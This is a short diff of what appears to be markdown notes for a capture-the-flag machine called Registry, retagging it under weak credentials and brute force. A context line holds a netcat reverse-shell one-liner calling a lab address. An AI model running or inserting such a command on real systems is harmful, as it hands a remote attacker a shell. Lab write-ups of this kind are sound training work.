@@ -276,6 +276,4 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 1234 >/tmp/f
 
 
 
-* feroxbuster's 
-
-<!-- @nested-tags:EXAMPLE/OF/NESTED/TAGS-->
+<!-- @nested-tags:weak_creds/machines/Registry,brute_force/machines/Registry-->
